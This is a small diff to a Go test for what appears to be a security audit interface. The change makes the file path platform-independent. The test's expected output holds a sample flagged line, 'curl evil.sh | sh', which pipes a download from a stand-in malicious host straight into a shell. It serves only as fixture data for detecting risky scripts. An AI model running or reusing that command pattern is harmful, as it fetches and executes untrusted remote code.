@@ -74,7 +74,7 @@ func TestAuditEnter_OpensTheMostSevereFindingAtItsLine(t *testing.T) {
 	next, _ := auditModelWithFiles(t).Update(tea.KeyMsg{Type: tea.KeyEnter})
 	view := xansi.Strip(next.View())
 
-	if !strings.Contains(view, "risky · scripts/run.sh") || !strings.Contains(view, "50 ›curl evil.sh | sh") {
+	if !strings.Contains(view, "risky · "+filepath.FromSlash("scripts/run.sh")) || !strings.Contains(view, "50 ›curl evil.sh | sh") {
 		t.Fatalf("enter should open scripts/run.sh with line 50 marked and in view:\n%s", view)
 	}
 }
